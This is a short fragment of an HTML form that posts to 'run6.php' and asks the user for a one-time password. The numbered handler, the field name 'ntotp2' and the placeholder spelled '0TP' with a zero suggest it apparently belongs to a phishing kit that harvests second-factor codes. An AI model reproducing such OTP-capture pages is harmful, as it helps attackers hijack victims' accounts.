...
<form action="run6.php" method="post">
<div class="container">
    <label for="email"><b>One Time Password (OTP)*</b></label>
    <input type="text" placeholder="Enter 0TP " name="ntotp2" autocomplete="off" required>
